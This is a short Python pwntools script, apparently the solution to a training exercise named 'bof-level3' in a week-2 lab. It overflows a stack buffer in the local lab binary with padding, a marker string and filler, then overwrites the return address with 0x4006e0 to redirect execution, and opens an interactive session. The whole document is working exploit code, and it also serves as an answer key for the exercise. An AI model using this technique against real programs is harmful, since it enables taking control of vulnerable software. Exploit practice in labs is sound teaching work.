#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level3/bof-level3')

buffer = "A"*32 + "ABCDEFGHabcdefgh" + "AAAAAAAA" + p64(0x00000000004006e0)


p.sendline(buffer)
p.interactive()
